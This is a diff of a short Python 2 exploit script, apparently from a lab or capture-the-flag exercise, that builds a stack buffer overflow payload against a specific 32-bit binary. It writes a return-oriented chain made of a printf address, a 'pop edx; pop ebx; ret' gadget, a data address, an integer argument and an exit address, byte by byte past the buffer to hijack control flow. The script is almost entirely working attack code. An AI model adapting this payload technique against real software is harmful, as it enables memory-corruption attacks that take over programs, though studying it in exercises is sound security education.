@@ -1,27 +1,32 @@
 #! /usr/bin/python2
+from sys import stdout, stderr
 
-print("__________")  # To be read into `plaintext`
+stdout.write("Six factorial is %d.      \x00\n")  # To be read into `plaintext`
 
-payload = (
-    0x080507f0,  # exit()
-)
+# Note payload cannot contain ord("\n")
+payload = [0x00000000] * 6 + [
+    0x80512e0,  # printf address
+    0x0805ebf9, # pop edx; pop ebx; ret;
+    0x80e6ce0, # plaintext  #0x80b40a4, # format string
+    125, # argument to printf %d argument
+    0x080507f0,  # exit address
+]
 
-# Note i is currently being overwritten by the newline character!
 #            &i   - &buffer
 len_buffer = 0x28 - 0x1c
 
-# Fill stack until the return address
-for i in range(24):
-    print("\x00" + "B" * (len_buffer - 1))
-
 # Write our required return address and data to the stack
 byte_mask = (0b1 << 8) - 1
+i = 0
 for word in payload:
     assert (word >> 32) == 0  # 4 byte address
-    for i in range(4):
+    for j in range(4):
         byte = word & byte_mask
-        print(chr(byte) + "B" * (len_buffer - 1))
+        if not (i == len(payload) - 1 and j == 3):
+            stdout.write(chr(byte) + "B" * (len_buffer - 1) + "\x00\x00\x00")
+        else:
+            stdout.write(chr(byte) + "B" * (len_buffer - 1) + "\x09\x00\x00")
         word >>= 8
+    i += 1
 
-# Finish writing data with a dummy byte
-print("\x00" + "B" * (len_buffer - 1) + chr(9) + chr(0) + chr(0) + chr(0))
+stdout.flush()
